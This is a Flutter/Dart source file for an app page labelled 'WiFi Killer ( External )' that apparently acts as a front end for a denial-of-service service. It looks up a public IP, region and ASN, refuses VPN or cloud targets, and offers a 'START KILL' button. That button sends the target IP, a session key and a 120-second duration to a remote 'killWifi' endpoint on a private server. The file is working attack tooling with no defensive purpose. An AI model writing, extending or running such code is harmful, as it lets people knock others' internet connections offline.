import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

class WifiInternalPage extends StatefulWidget {
  final String sessionKey;
  const WifiInternalPage({super.key, required this.sessionKey});

  @override
  State<WifiInternalPage> createState() => _WifiInternalPageState();
}

class _WifiInternalPageState extends State<WifiInternalPage> {
  String publicIp = "-";
  String region = "-";
  String asn = "-";
  bool isVpn = false;
  bool isLoading = true;
  bool isAttacking = false;

  // --- Theme Colors (Glowing Silver) ---
  static const Color primaryColor = Color(0xFFE0E0E0); // Silver/Abu-abu Menyala
  static const Color backgroundColor = Color(0xFF050505); // Hitam Pekat
  static const Color cardColor = Color(0xFF1A1A1A); // Abu-abu Gelap

  @override
  void initState() {
    super.initState();
    _loadPublicInfo();
  }

  Future<void> _loadPublicInfo() async {
    setState(() {
      isLoading = true;
    });

    try {
      final ipRes = await http.get(Uri.parse("https://api.ipify.org?format=json"));
      final ipJson = jsonDecode(ipRes.body);
      final ip = ipJson['ip'];

      final infoRes = await http.get(Uri.parse("http://ip-api.com/json/$ip?fields=as,regionName,status,query"));
      final info = jsonDecode(infoRes.body);

      final asnRaw = (info['as'] as String).toLowerCase();
      final isBlockedAsn = asnRaw.contains("vpn") ||
          asnRaw.contains("cloud") ||
          asnRaw.contains("digitalocean") ||
          asnRaw.contains("aws") ||
          asnRaw.contains("google");

      setState(() {
        publicIp = ip;
        region = info['regionName'] ?? "-";
        asn = info['as'] ?? "-";
        isVpn = isBlockedAsn;
        isLoading = false;
      });
    } catch (e) {
      setState(() {
        publicIp = region = asn = "Error";
        isLoading = false;
      });
    }
  }

  Future<void> _attackTarget() async {
    setState(() => isAttacking = true);
    final url = Uri.parse(
        "http://hannmodzzprivate.mysrv.web.id:2893/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
    try {
      final res = await http.get(url);
      if (res.statusCode == 200) {
        _showAlert("✅ Attack Sent", "WiFi attack sent to $publicIp");
      } else {
        _showAlert("❌ Failed", "Server rejected the request.");
      }
    } catch (e) {
      _showAlert("Error", "Network error: $e");
    } finally {
      setState(() => isAttacking = false);
    }
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardColor,
        shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(16),
            side: BorderSide(color: primaryColor.withOpacity(0.3))
        ),
        title: Text(title,
            style: const TextStyle(
                color: primaryColor,
                fontFamily: 'Orbitron',
                fontWeight: FontWeight.bold,
                shadows: [Shadow(color: primaryColor, blurRadius: 2)]
            )
        ),
        content: Text(message,
            style: const TextStyle(color: Colors.white70)),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("OK", style: TextStyle(color: primaryColor)),
          ),
        ],
      ),
    );
  }

  Widget _infoCard(String title, String value, IconData icon) {
    return Card(
      color: cardColor,
      shadowColor: primaryColor.withOpacity(0.2),
      elevation: 6,
      shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(16),
          side: BorderSide(color: primaryColor.withOpacity(0.1))
      ),
      child: ListTile(
        leading: Icon(icon, color: primaryColor),
        title: Text(title,
            style: TextStyle(
                color: primaryColor.withOpacity(0.7),
                fontWeight: FontWeight.bold,
                fontFamily: "Orbitron")),
        subtitle: Text(value,
            style: const TextStyle(color: primaryColor, fontSize: 16)),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: backgroundColor,
      appBar: AppBar(
        title: const Text("📡 WiFi Killer ( External )",
            style: TextStyle(
                fontFamily: 'Orbitron',
                fontWeight: FontWeight.bold,
                color: primaryColor
            )
        ),
        backgroundColor: backgroundColor,
        iconTheme: const IconThemeData(color: primaryColor),
        elevation: 0,
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(1),
          child: Container(color: primaryColor.withOpacity(0.2), height: 1),
        ),
      ),
      body: Container(
        decoration: const BoxDecoration(
          color: backgroundColor,
        ),
        child: Padding(
          padding: const EdgeInsets.all(16),
          child: isLoading
              ? const Center(
              child: CircularProgressIndicator(color: primaryColor))
              : Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              const Text("🎯 System Information",
                  style: TextStyle(
                      fontSize: 20,
                      color: primaryColor,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Orbitron',
                      shadows: [Shadow(color: primaryColor, blurRadius: 5)]
                  )),
              const SizedBox(height: 12),

              // Info Cards
              _infoCard("IP Address", publicIp, Icons.language),
              _infoCard("Region", region, Icons.map),
              _infoCard("ASN", asn, Icons.storage),

              const SizedBox(height: 20),

              if (isVpn)
                Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: cardColor,
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: Colors.redAccent), // Keep red for warning
                  ),
                  child: const Text(
                    "⚠️ Target berasal dari VPN/Hosting.\nSerangan dibatalkan.",
                    textAlign: TextAlign.center,
                    style: TextStyle(
                        color: Colors.white,
                        fontFamily: 'ShareTechMono'),
                  ),
                ),

              if (!isVpn)
                Center(
                  child: ElevatedButton.icon(
                    onPressed: isAttacking ? null : _attackTarget,
                    icon: const Icon(Icons.wifi_off, color: Colors.black),
                    label: Text(
                      isAttacking ? "ATTACKING..." : "START KILL",
                      style: const TextStyle(
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.bold),
                    ),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: primaryColor,
                      foregroundColor: Colors.black,
                      padding: const EdgeInsets.symmetric(
                          horizontal: 40, vertical: 16),
                      shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(30)),
                      elevation: 10,
                      shadowColor: primaryColor.withOpacity(0.5),
                    ),
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }
}